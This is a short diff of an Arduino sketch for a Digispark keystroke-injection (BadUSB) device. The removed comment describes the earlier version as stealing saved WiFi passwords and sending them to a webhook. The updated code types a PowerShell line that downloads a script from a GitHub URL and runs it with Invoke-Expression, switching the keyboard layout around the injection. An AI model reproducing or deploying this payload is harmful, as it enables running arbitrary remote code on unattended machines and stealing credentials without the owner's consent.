@@ -1,5 +1,6 @@
 /*
-  Following payload will grab saved Wifi password and will send them to your hosted webhook.
+  Following payload will force the keyboard layout to en-us (currently from de-de only) and restores the previous settings after the execution. 
+  Payload: Executes the PowerShell script stored at https://raw.githubusercontent.com/rbnkng/RemoteLoadedPSScript/main/Get-ServiceTest.ps1
 */
 
 #include "DigiKeyboard.h"
@@ -32,8 +33,6 @@ void loop() {
   DigiKeyboard.println("Invoke-Expression (Invoke-WebRequest https://raw.githubusercontent.com/rbnkng/RemoteLoadedPSScript/main/Get-ServiceTest.ps1).Content");
     
   // Restore language settings
-  //DigiKeyboard.println("Set/WinUserLanguageList /force $a");
-  //DigiKeyboard.delay(500);
   DigiKeyboard.println("Set-WinUserLanguageList -force $a");
   DigiKeyboard.delay(500);
    
